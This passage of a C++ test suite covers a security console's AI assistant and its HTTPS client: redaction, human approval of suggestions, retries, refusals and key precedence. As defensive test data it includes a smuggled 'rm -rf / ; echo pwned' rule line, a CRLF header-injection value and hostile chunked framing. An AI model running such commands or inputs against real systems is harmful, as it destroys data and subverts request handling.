	auto &h = m.headers[0];
	CHECK_EQ(h["x-api-key"], "test-key-0123");
	CHECK_EQ(h["anthropic-version"], "2026-10-21");
	CHECK_EQ(h["anthropic-beta"], "server-side-fallback-2026-07-01");
	CHECK_EQ(b["model"], "claude-opus-5-5");
	CHECK_EQ(b["fallbacks"], "default");
	CHECK_EQ(b["output_config"]["effort"], "high");
	CHECK_EQ(b["output_config"]["format"]["type"], "json_schema");
	CHECK_EQ(b["output_config"]["format"]["schema"]["additionalProperties"], false);
	CHECK(!b.contains("temperature") && !b.contains("thinking"));
	std::string prompt = b["messages"][0]["content"];
	CHECK(contains(prompt, "<fleet_data>") && contains(prompt, "evil.example"));
	CHECK(!contains(b.dump(), "sekr3tT0kenValue"));  // redacted before it left the console
	// suggestions wait for a human, attributed to the AI
	auto pushes = e.suggestion_of("ai_push", "lap-1");
	CHECK(pushes != nullptr && pushes["source"] == "ai" && pushes["status"] == "proposed");
	CHECK(e.suggestion_of("ai_push", "lap-9") == nullptr);
	{
		std::lock_guard g(e.links["lap-1"]->mu);
		CHECK_EQ(e.links["lap-1"]->sent.size(), (size_t)0);  // nothing was pushed
	}
	auto det = body_json(e.areq("GET", "/api/incidents/detail?id=" + inc.id, TOK_VIEWER));
	CHECK_EQ(det["ai"]["result"]["summary"], "Reverse shell by an AI agent.");
	CHECK_EQ(det["suggestions"].size(), (size_t)3);
	// journaled for audit, restored on restart, never with the key
	e.ai->stop();
	std::ifstream jf(e.st.journal_path());
	std::stringstream ss;
	ss << jf.rdbuf();
	CHECK(contains(ss.str(), "\"type\":\"ai_result\""));
	CHECK(!contains(ss.str(), "test-key-0123"));
	Store st2;
	Analyst an2(st2);
	st2.replay_hook = [&](const json &r) { an2.replay(r); };
	st2.open_journal(e.st.journal_path());
	CHECK(an2.ai_for(inc.id).has_value());
	st2.close_journal();
}

TEST(AiCurateKeepsOnlyValidRuleLines) {
	MockApi m;
	AnEnv e;
	for (int i = 0; i < 4; i++)
		e.send(alert("dev-1", "CRED-001", "high", minutes(10 + i), "human", "tty", 10 + i, 1, "alert", "git"));
	json result = {{"verdict", "tune"},
	               {"assessment", "fires on git"},
	               {"proposals",
	                {{{"change", "narrow"},
	                  {"rule_line", R"(CRED-001 high alert T1552.001 "Read of SSH private key" cmd*=/.ssh/id_ !comm=git)"},
	                  {"rationale", "exclude git"}},
	                 {{"change", "new_rule"}, {"rule_line", "rm -rf / ; echo pwned"}, {"rationale", "evil"}}}}};
	m.handler = [&](const json &, int) {
		return MockApi::Reply{200, api_message({{{"type", "text"}, {"text", result.dump()}}})};
	};
	e.ai = std::make_unique<Assistant>(e.st, e.an, test_ai(m));
	CHECK_EQ(e.areq("POST", "/api/ai/curate", TOK_OPERATOR, R"({"rule":"NOPE-1"})").status, 400);
	auto job = wait_job(*e.ai, e.ai->submit("curate", "CRED-001", "olive")["id"]);
	CHECK_EQ(job["status"], "done");
	CHECK_EQ(job["result"]["suggestions"].size(), (size_t)1);
	CHECK_EQ(job["result"]["dropped"].size(), (size_t)1);
	auto s = e.suggestion_of("ai_rule");
	CHECK(s != nullptr && contains(s["action"]["instructions"].get<std::string>(), "!comm=git"));
	CHECK(contains(m.bodies[0]["messages"][0]["content"].get<std::string>(), "rules.conf grammar"));
	auto rules = body_json(e.areq("GET", "/api/analysis/rules", TOK_VIEWER));
	CHECK_EQ(rules[0]["ai"]["result"]["verdict"], "tune");
}

TEST(AiAskRunsReadOnlyToolsAndReturnsThinkingUnchanged) {
	MockApi m;
	AnEnv e;
	e.connect("lap-1", "dev", "monitor");
	e.send(alert("lap-1", "CRED-001", "high", minutes(5), "ai", "claude", 10, 1));
	json first = api_message({{{"type", "thinking"}, {"thinking", ""}, {"signature", "sig-1"}},
	                          {{"type", "tool_use"}, {"id", "toolu_1"}, {"name", "get_host"}, {"input", {{"name", "lap-1"}}}},
	                          {{"type", "tool_use"}, {"id", "toolu_2"}, {"name", "no_such_tool"}, {"input", json::object()}}},
	                         "tool_use");
	m.handler = [&](const json &, int n) {
		if (n == 1)
			return MockApi::Reply{200, first};
		return MockApi::Reply{200, api_message({{{"type", "text"}, {"text", "lap-1 is in monitor mode."}}})};
	};
	e.ai = std::make_unique<Assistant>(e.st, e.an, test_ai(m));
	auto job = wait_job(*e.ai, e.ai->submit("ask", "Which hosts are not enforcing?", "olive")["id"]);
	CHECK_EQ(job["status"], "done");
	CHECK_EQ(job["result"]["answer"], "lap-1 is in monitor mode.");
	CHECK_EQ(job["result"]["tool_calls"].size(), (size_t)2);
	CHECK_EQ(m.count(), (size_t)2);
	auto &b0 = m.bodies[0];
	CHECK_EQ(b0["tools"].size(), (size_t)10);
	for (auto &t : b0["tools"])
		CHECK(t["strict"] == true && t["input_schema"]["additionalProperties"] == false);
	auto &msgs = m.bodies[1]["messages"];
	CHECK_EQ(msgs.size(), (size_t)3);
	CHECK_EQ(msgs[1]["content"], first["content"]);  // assistant turn echoed unchanged
	CHECK_EQ(msgs[2]["content"].size(), (size_t)2);  // both results in one user message
	CHECK_EQ(msgs[2]["content"][0]["tool_use_id"], "toolu_1");
	CHECK(contains(msgs[2]["content"][0]["content"].get<std::string>(), "\"name\":\"lap-1\""));
	CHECK_EQ(msgs[2]["content"][1]["is_error"], true);
	CHECK_EQ(e.areq("POST", "/api/ai/ask", TOK_VIEWER, R"({"question":"hi"})").status, 403);
	CHECK_EQ(e.areq("POST", "/api/ai/ask", TOK_OPERATOR, R"({"question":""})").status, 400);
	CHECK_EQ(e.areq("GET", "/api/ai/jobs", TOK_VIEWER).status, 403);
	CHECK_EQ(body_json(e.areq("GET", "/api/ai/jobs", TOK_OPERATOR)).size(), (size_t)1);
}

TEST(AiErrorsRetriesRefusalsAndLimits) {
	MockApi m;
	AnEnv e;
	std::atomic<int> mode{0};
	m.handler = [&](const json &, int) -> MockApi::Reply {
		switch (mode.load()) {
		case 0:
			return {401, {{"type", "error"}, {"error", {{"type", "authentication_error"}, {"message", "invalid x-api-key"}}}}};
		case 1: {
			static std::atomic<int> calls{0};
			if (calls++ == 0)
				return {429, {{"type", "error"}, {"error", {{"type", "rate_limit_error"}, {"message", "slow"}}}}, "1"};
			return {200, api_message({{{"type", "text"}, {"text", "fine"}}})};
		}
		default: {
			json r = api_message(json::array(), "refusal");
			r["stop_details"] = {{"type", "refusal"}, {"category", "cyber"}};
			return {200, r};
		}
		}
	};
	auto cfg = test_ai(m);
	e.ai = std::make_unique<Assistant>(e.st, e.an, cfg);
	auto j = wait_job(*e.ai, e.ai->submit("ask", "q1", "olive")["id"]);
	CHECK_EQ(j["status"], "failed");
	CHECK(contains(j["error"].get<std::string>(), "401 authentication_error: invalid x-api-key"));
	CHECK_EQ(m.count(), (size_t)1);  // client errors are not retried
	mode = 1;
	j = wait_job(*e.ai, e.ai->submit("ask", "q2", "olive")["id"]);
	CHECK_EQ(j["status"], "done");
	CHECK_EQ(m.count(), (size_t)3);  // 429, then success after retry-after
	mode = 2;
	j = wait_job(*e.ai, e.ai->submit("ask", "q3", "olive")["id"]);
	CHECK_EQ(j["status"], "failed");
	CHECK(contains(j["error"].get<std::string>(), "declined") && contains(j["error"].get<std::string>(), "cyber"));
	e.ai->stop();

	// No key: off, with a clear reason; a vault secret turns it on.
	AiConfig nokey = cfg;
	nokey.api_key.clear();
	e.ai = std::make_unique<Assistant>(e.st, e.an, nokey);
	CHECK_EQ(e.ai->status_json()["enabled"], false);
	auto r = e.areq("POST", "/api/ai/ask", TOK_OPERATOR, R"({"question":"hi"})");
	CHECK_EQ(r.status, 503);
	CHECK(contains(r.body, "anthropic/api-key"));
	std::string err;
	CHECK(e.st.vault->set("anthropic/api-key", "vault-key-1\n", &err));
	CHECK_EQ(e.ai->status_json()["enabled"], true);
	mode = 1;
	j = wait_job(*e.ai, e.ai->submit("ask", "q4", "olive")["id"]);
	CHECK_EQ(j["status"], "done");
	CHECK_EQ(m.headers.back()["x-api-key"], "vault-key-1");
	e.ai->stop();

	// Hourly cap.
	AiConfig capped = cfg;
	capped.max_per_hour = 1;
	e.ai = std::make_unique<Assistant>(e.st, e.an, capped);
	CHECK_EQ(e.areq("POST", "/api/ai/ask", TOK_OPERATOR, R"({"question":"a"})").status, 202);
	CHECK_EQ(e.areq("POST", "/api/ai/ask", TOK_OPERATOR, R"({"question":"b"})").status, 429);
	e.ai->stop();

	// Disabled entirely.
	e.ai.reset();
	CHECK_EQ(body_json(e.areq("GET", "/api/ai/status", TOK_VIEWER))["enabled"], false);
	CHECK_EQ(e.areq("POST", "/api/ai/ask", TOK_OPERATOR, R"({"question":"a"})").status, 503);
	// Haiku has no server-side fallback: the parameter is left out.
	AiConfig haiku = cfg;
	haiku.model = "claude-haiku-5-5";
	Assistant h(e.st, e.an, haiku);
	mode = 1;
	h.call({{"messages", {{{"role", "user"}, {"content", "x"}}}}}, nullptr);
	CHECK(!m.bodies.back().contains("fallbacks"));
	CHECK(m.headers.back().count("anthropic-beta") == 0);
	CHECK_EQ(m.bodies.back()["model"], "claude-haiku-5-5");
}

TEST(HttpsClientBodiesAndCertificateChecks) {
	MockApi m;
	m.handler = [](const json &, int n) {
		MockApi::Reply r{200, {{"ok", true}, {"pad", std::string(5000, 'x')}}};
		r.chunked = n == 2;
		return r;
	};
	for (int i = 0; i < 2; i++) {  // Content-Length, then chunked
		auto r = https_request("POST", m.url() + "/v1/messages", {{"Content-Type", "application/json"}}, "{}",
		                       seconds(5), m.cert());
		CHECK_EQ(r.status, 200);
		CHECK_EQ(json::parse(r.body)["ok"], true);
		CHECK_EQ(r.headers.count("transfer-encoding"), (size_t)(i == 1));
	}
	// untrusted certificate is refused
	auto bad = https_request("POST", m.url() + "/x", {}, "{}", seconds(5), "");
	CHECK_EQ(bad.status, -1);
	CHECK(contains(bad.error, "TLS"));
	CHECK_EQ(https_request("GET", "http://127.0.0.1/", {}, "", seconds(1), "").status, -1);
}

TEST(HttpsClientSkipsInterimResponsesAndRefusesHostileFraming) {
	MockApi m;
	m.handler = [](const json &, int n) {
		MockApi::Reply r;
		if (n == 1)  // 103 Early Hints, then the real answer
			r.raw = "HTTP/1.1 103 Early Hints\r\nLink: </x>\r\n\r\nHTTP/1.1 200 OK\r\nContent-Length: 2\r\n"
			        "Connection: close\r\n\r\nok";
		else if (n == 2)  // a chunk size that used to wrap the bound check and loop forever
			r.raw = "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
			        "FFFFFFFFFFFFFFEC\r\n0\r\n\r\n";
		else if (n == 3)  // extensions and trailers are fine
			r.raw = "HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
			        "3;name=v\r\nabc\r\n0\r\nX-Trailer: y\r\n\r\n";
		else  // a Content-Length that is not a number
			r.raw = "HTTP/1.1 200 OK\r\nContent-Length: 2x\r\nConnection: close\r\n\r\nok";
		return r;
	};
	auto post = [&] { return https_request("POST", m.url() + "/v1/messages", {}, "{}", seconds(3), m.cert()); };
	auto r = post();
	CHECK_EQ(r.status, 200);
	CHECK_EQ(r.body, std::string("ok"));
	auto t0 = steady_clock::now();
	r = post();
	CHECK_EQ(r.status, -1);
	CHECK(contains(r.error, "chunked"));
	CHECK(steady_clock::now() - t0 < seconds(2));
	r = post();
	CHECK_EQ(r.status, 200);
	CHECK_EQ(r.body, std::string("abc"));
	r = post();
	CHECK_EQ(r.status, -1);
	CHECK(contains(r.error, "Content-Length"));
	// Header text is never sent with control characters (a key with an
	// embedded newline cannot add headers); nothing is even connected.
	auto bad = https_request("POST", m.url() + "/x", {{"x-api-key", "k\r\nX-Injected: 1"}}, "", seconds(2), m.cert());
	CHECK(bad.status == -1 && contains(bad.error, "invalid request header"));
	CHECK(https_request("GET\r\n", m.url(), {}, "", seconds(2), m.cert()).status == -1);
	CHECK(https_request("GET", m.url() + "/a b", {}, "", seconds(2), m.cert()).status == -1);
	CHECK_EQ(m.count(), (size_t)4);
}

TEST(AiKeyPrecedenceIsFileThenVaultThenEnvironment) {
	MockApi m;
	m.handler = [](const json &, int) { return MockApi::Reply{200, api_message({{{"type", "text"}, {"text", "hi"}}})}; };
	auto key_used = [&](const std::string &file_key, const std::string &vault_key, const std::string &env_key) {
		AnEnv e;
		std::string err;
		if (!vault_key.empty())
			e.st.vault->set("anthropic/api-key", vault_key, &err);
		AiConfig c = test_ai(m);
		c.api_key = file_key;
		c.env_key = env_key;
		e.ai = std::make_unique<Assistant>(e.st, e.an, c);
		std::string id = e.ai->submit("ask", "which key?", "olive")["id"];
		wait_job(*e.ai, id);
		std::lock_guard g(m.mu);
		return m.headers.empty() ? std::string("?") : m.headers.back()["x-api-key"];
	};
	// A key rotated through the vault wins over a stale one in the environment.
	CHECK_EQ(key_used("", "vault-key-NEW", "env-key-OLD"), std::string("vault-key-NEW"));
	CHECK_EQ(key_used("", "", " env-key \n"), std::string("env-key"));  // trimmed
	CHECK_EQ(key_used("file-key", "vault-key-NEW", "env-key-OLD"), std::string("file-key"));
}

TEST(AnalysisConcurrentWithIngestAndDecisions) {
	AnEnv e;
	for (int i = 0; i < 6; i++)
		e.connect("c-" + std::to_string(i), "g", "monitor");
	std::atomic<bool> done{false};
	std::vector<std::thread> th;
	th.emplace_back([&] {  // sensors keep reporting
		for (int k = 0; k < 300; k++)
			e.send(alert("c-" + std::to_string(k % 6), k % 3 ? "CRED-001" : "RSHELL-01", k % 3 ? "high" : "critical",
			             minutes(k % 50), "ai", "claude", 100 + k % 7, 1, "would-block"));
		done = true;
	});
	th.emplace_back([&] {  // the analysis loop
		while (!done)
			e.an.run();
	});
	th.emplace_back([&] {  // operators approving whatever shows up
		while (!done)
			for (auto &s : e.an.suggestions_json("")) {
				try {
					e.an.decide(s["id"], true, "olive", "operator", "");
				} catch (const std::invalid_argument &) {  // decided by someone else meanwhile
				}
			}
	});
	th.emplace_back([&] {  // readers
		while (!done) {
			e.areq("GET", "/api/incidents?status=all", TOK_VIEWER);
			e.an.health_json();
			e.an.rules_json();
		}
	});
	for (auto &t : th)
		t.join();
	e.an.run();
	for (auto &s : e.an.suggestions_json(""))
		e.an.decide(s["id"], true, "olive", "operator", "");
	int applied = 0;
	for (auto &s : e.an.suggestions_json("all"))
		applied += s["status"] == "applied";
	CHECK_EQ(applied, 6);  // one contain per host, each applied exactly once
	for (int i = 0; i < 6; i++) {
		std::lock_guard g(e.links["c-" + std::to_string(i)]->mu);
		CHECK_EQ(e.links["c-" + std::to_string(i)]->sent.size(), (size_t)1);
	}
}

TEST(IncidentCacheFollowsStoreChanges) {
	AnEnv e;
	e.connect("c-1", "g", "monitor");
	e.send(alert("c-1", "CRED-001", "high", minutes(5), "ai", "claude", 10, 1));
	CHECK_EQ(e.an.incidents().size(), (size_t)1);
	auto gen = e.st.generation();
	e.an.incidents();
	CHECK_EQ(e.st.generation(), gen);  // a pure read does not move the generation
	e.send(alert("c-1", "AI-003", "high", minutes(4), "ai", "claude", 10, 1));
	CHECK_EQ(e.an.incidents().at(0).alerts.size(), (size_t)2);  // new alert joins the incident
	e.send(alert("c-1", "LOL-003", "low", minutes(3), "human", "tty", 50, 2));
	CHECK_EQ(e.an.incidents().size(), (size_t)2);
	// a mode change arrives by heartbeat (never journaled) and must still be seen
	e.heartbeat("c-1", "enforce");
	CHECK(e.st.generation() > gen);
	e.st.triage(e.st.alerts_copy().back().id, "resolved", "done", "olive");  // the single-alert incident
	int resolved = 0;
	for (auto &i : e.an.incidents())
		resolved += i.status == "resolved";
	CHECK_EQ(resolved, 1);
}

TEST(AiShutdownCancelsInFlightRequest) {
	MockApi m;
	AnEnv e;
	std::atomic<bool> release{false};
	m.handler = [&](const json &, int) {
		for (int i = 0; i < 300 && !release; i++)  // a hung gateway: no reply for 30 s
			std::this_thread::sleep_for(milliseconds(100));
		return MockApi::Reply{200, api_message({{{"type", "text"}, {"text", "late"}}})};
	};
	e.ai = std::make_unique<Assistant>(e.st, e.an, test_ai(m));
	std::string id = e.ai->submit("ask", "slow", "olive")["id"];
	for (int i = 0; i < 100 && (*e.ai->job(id))["status"] != "running"; i++)
		std::this_thread::sleep_for(milliseconds(20));
	std::this_thread::sleep_for(milliseconds(300));  // let the request reach the mock
	auto t0 = steady_clock::now();
	e.ai->stop();
	auto took = duration_cast<milliseconds>(steady_clock::now() - t0);
	CHECK(took < seconds(3));
	auto j = *e.ai->job(id);
	CHECK_EQ(j["status"], "failed");
	CHECK(contains(j["error"].get<std::string>(), "shutting down"));
	release = true;
}
